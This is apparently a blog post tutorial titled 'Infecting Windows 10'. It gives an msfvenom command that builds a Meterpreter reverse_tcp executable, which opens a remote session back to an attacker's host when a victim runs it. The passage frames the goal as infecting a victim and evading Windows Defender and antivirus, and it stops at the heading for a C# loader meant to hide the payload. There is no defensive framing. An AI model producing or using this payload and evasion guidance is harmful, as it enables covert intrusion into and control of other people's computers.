---
layout: post
title:  "Infecting Windows 10"
date:   2023-06-30 21:21:21 +0530
tags: [csharp,kali-linux,virus]
---

**Introduction to Infecting Windows 10**

For my first post that has actual content, I am going to show you guys how to create a payload in Metasploit on Kali Linux and then create a loader for it in C#!

**Step 1: Creating the Payload**

First you need to hop on Kali and open a terminal. Then we are going to use a command to create a payload for us to use. Type the following in your terminal:
```bash
$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > payload.exe
```
Okay so, what does the do? This command creates a compiled binary that contains the payload `windows/meterpreter/reverse_tcp` which is a payload that allows us to start a Metasploit session once they run the program.

<i>HOST</i> refers to the ip of the attacker (127.0.0.1)
<i>PORT</i> refers to the port that you will listen to on your attacking machine (4444)

You now have your payload and it's time to infect your victim! Except, oh wait! Windows Defender and every antivirus every made will detect this because it's been exposed to the public for years. So, how do we hide it and make it undetectable?

**Step 2: Creating the Loader**